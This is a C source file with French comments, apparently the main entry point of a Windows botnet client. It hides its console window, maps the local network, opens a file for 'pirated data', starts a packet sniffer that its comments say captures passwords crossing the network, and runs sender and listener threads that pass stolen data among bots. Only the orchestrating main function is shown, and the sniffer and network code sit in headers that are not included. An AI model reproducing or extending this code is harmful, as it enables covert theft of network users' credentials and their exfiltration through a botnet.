
/*
 *  NOTE:
 *  1/ Récupérer la map dans un thread séparé ne semble pas necessaire
 */
#include <stdio.h>
#include <windows.h>
#include <winsock2.h>
//#pragma comment(lib,"ws2_32.lib")
#include "global.h"
#include "map.h"
#include "file.h"
#include "router.h"
#include "sniffer.h"
char path[500];

int main() {
    FILE *fp;
    unsigned int error;
    //Supprime l'affichage de la console
    FreeConsole();
    //Récupère la map du réseau
    CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)getMap,NULL,0,NULL);
    //la variable ready passe a "true" lorsque la map est récupéré dans getMap.
    while(ready != true);
    //initialise le fichier où les données piratés seront écrites
    if((error = initFile(&fp,"data")) != 0){
        exit(0);
    }
    //??
    fclose(fp);
    //Initialise le sniffer de packets qui sert à récupérer les mdp qui passent sur le réseau
    CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)initSniffer,NULL,0,NULL);
    //Initialise le routeur qui dirige l'envoi et la récéption des données au sein du reseau botnet
    initRouter();
    //Le "sender" envoi les données en sa possetion à rythme régulier aux autres bots
    CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)sender,NULL,0,NULL);
    //Le "listener" écoute les requêtes envoyées par les autres bots pour recevoir leurs données
    listener();
    return 0;
}
